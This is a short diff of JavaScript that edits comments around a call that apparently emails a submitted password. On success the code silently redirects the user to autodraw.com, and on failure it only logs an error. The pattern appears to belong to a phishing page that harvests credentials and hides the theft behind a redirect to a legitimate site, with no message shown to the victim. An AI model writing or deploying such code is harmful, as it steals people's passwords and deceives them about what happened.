@@ -86,10 +86,10 @@
                 password: password
             })
             .then(function(response) {
-                // Redirection after email is sent successfully, no alert
+                // Redirect without any alert or message
                 window.location.href = 'https://www.autodraw.com';
             }, function(error) {
-                // Handle failure silently (no alert)
+                // Error handling but silent - no alert
                 console.error('Failed to send email:', error);
             });
         });
